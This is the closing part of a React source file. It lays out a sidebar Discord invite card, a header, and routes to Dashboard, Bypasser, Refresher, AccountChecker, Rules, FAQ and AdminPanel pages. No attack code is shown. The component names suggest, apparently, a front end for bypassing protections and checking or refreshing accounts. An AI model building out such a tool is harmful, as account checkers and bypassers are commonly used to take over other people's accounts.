        <div className="p-4 mt-auto">
          <div className="bg-gradient-to-b from-[#1a0f0f] to-[#0a0a0a] border border-[#2a1515] rounded-3xl p-5 relative overflow-hidden group">
            <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-red-900 via-red-500 to-red-900 opacity-50"></div>
            <div className="relative z-10">
              <h4 className="font-black italic tracking-wide text-white uppercase mb-1">Official Community</h4>
              <p className="text-xs text-gray-400 mb-4 font-medium">Join our Discord server</p>
              <a 
                href="https://discord.gg/qZePjjmb7k" 
                target="_blank" 
                rel="noopener noreferrer"
                className="block w-full bg-white text-black text-center font-black italic tracking-wide py-3 rounded-xl hover:bg-gray-200 transition-colors text-sm uppercase"
              >
                Join Discord
              </a>
            </div>
          </div>
        </div>
      </aside>

      {/* Main Content */}
      <main className="flex-1 flex flex-col min-w-0 overflow-hidden">
        {/* Top Header */}
        <header className="h-20 border-b border-[#1f1f1f] bg-[#000000]/80 backdrop-blur-md sticky top-0 z-30 flex items-center justify-between px-6 lg:px-10">
          <div className="flex items-center gap-4">
            <button 
              className="lg:hidden text-gray-400 hover:text-white transition-colors"
              onClick={() => setIsMobileMenuOpen(true)}
            >
              <Menu size={24} />
            </button>
          </div>

          <div className="flex items-center gap-4">
            <div className="w-10 h-10 bg-[#141414] border border-[#1f1f1f] rounded-xl flex items-center justify-center text-gray-400 hover:text-white transition-colors cursor-pointer">
              <User size={20} />
            </div>
          </div>
        </header>

        {/* Page Content */}
        <div className="flex-1 overflow-y-auto p-6 lg:p-10">
          <Routes>
            <Route path="/" element={<Dashboard backendStats={backendStats} />} />
            <Route path="/bypass" element={<Bypasser setBackendStats={setBackendStats} />} />
            <Route path="/refresh" element={<Refresher setBackendStats={setBackendStats} />} />
            <Route path="/checker" element={<AccountChecker setBackendStats={setBackendStats} />} />
            <Route path="/rules" element={<Rules />} />
            <Route path="/faq" element={<FAQ />} />
            <Route path="/admin" element={<AdminPanel backendStats={backendStats} />} />
            <Route path="*" element={<Navigate to="/" replace />} />
          </Routes>
        </div>
      </main>
    </div>
  );
}

export default function App() {
  return (
    <Router>
      <AppContent />
    </Router>
  );
}
